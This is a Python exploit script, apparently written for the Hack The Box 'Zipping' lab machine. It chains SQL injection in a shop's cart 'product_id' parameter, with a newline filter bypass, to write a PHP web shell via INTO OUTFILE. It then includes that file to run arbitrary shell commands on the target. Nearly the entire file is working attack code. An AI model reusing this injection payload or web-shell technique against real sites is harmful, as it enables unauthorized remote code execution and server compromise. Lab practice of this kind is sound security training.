#!/usr/bin/env python3

'''
HTB Zipping (RCE by SQLi)
-----------------
Description: SQL inyection when adding a product to cart
Author: Marss
Repository: https://github.com/E1P0TR0
Date: 13 Sep, 2023
'''

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from random import choices
from requests import Session
from requests.exceptions import ConnectionError, ConnectTimeout
from signal import signal, SIGINT
from string import ascii_letters
from sys import argv
from urllib.parse import urlencode

# Ctrl + c
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))


# Main class
class Exploit:

    get_rand_str = lambda self, length: ''.join(choices(ascii_letters, k=length))

    def __init__(self, args):

        self.args = args
        self.target = {'base_url':'http://10.10.11.229'}
        self.temp_file = self.get_rand_str(5)
        # Session
        self.session = Session()
    
    def run(self):
        
        if self.target_response():
            
            self.send_query()

    def send_query(self):
        
        try:
            backdoor_path = "/var/lib/mysql"
            payload = f"%0a';select '<?php system($_GET[\"cmd\"]); ?>' into outfile '/{backdoor_path}/{self.temp_file}.php'#1"
            
            headers = {'Content-Type':'application/x-www-form-urlencoded'}
            post_data = {
                'quantity':1,
                'product_id': payload # vulnerable parameter
            }
            post_data_enc = urlencode(post_data, safe='%') # %0a bypass (newline)

            response = self.session.post(
                self.target['base_url'] + '/shop/index.php?page=cart',
                headers=headers,
                data=post_data_enc,
                allow_redirects=False)

            if not response.status_code == 302:
                exit('\n[x] Backdoor failed.')
            
            response = self.session.get(
                self.target['base_url'] + f'/shop/index.php',
                params=f'page={backdoor_path}/{self.temp_file}&cmd={args.command}')
            
            print(f'\n{response.text}')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def target_response(self):

        try:
            response = self.session.get(self.target['base_url'] + '/shop', timeout=5)

            if response.ok:
                print(f'\n[+] Target up: {response.url}')
            
            return response.ok

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection')
        except ConnectionError:
            exit('[!] Check the machine connection')

# Main flow
if __name__ == '__main__':

    title = '\n| HTB Zipping (RCE by SQLi) |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} -c "<command>"
        ''')

    parser.add_argument('-c', '--command', type=str, required=True, help='Command to execute')

    args =parser.parse_args()

    print(title)

    exploit = Exploit(args)
    exploit.run()